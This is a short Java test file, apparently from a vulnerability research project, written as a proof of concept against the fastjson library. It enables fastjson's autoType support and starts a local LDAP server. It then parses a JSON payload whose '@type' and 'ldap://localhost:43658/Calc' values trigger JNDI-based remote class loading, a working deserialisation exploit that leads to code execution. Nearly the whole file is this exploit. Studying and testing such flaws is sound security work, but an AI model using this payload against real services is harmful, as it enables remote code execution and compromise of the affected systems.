package com.threedr3am.bug.fastjson.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.server.LdapServer;

/**
 * 挖洞
 *
 * @author threedr3am
 */
public class TestPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"\",\"aaaaa\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parse(payload);
  }
}
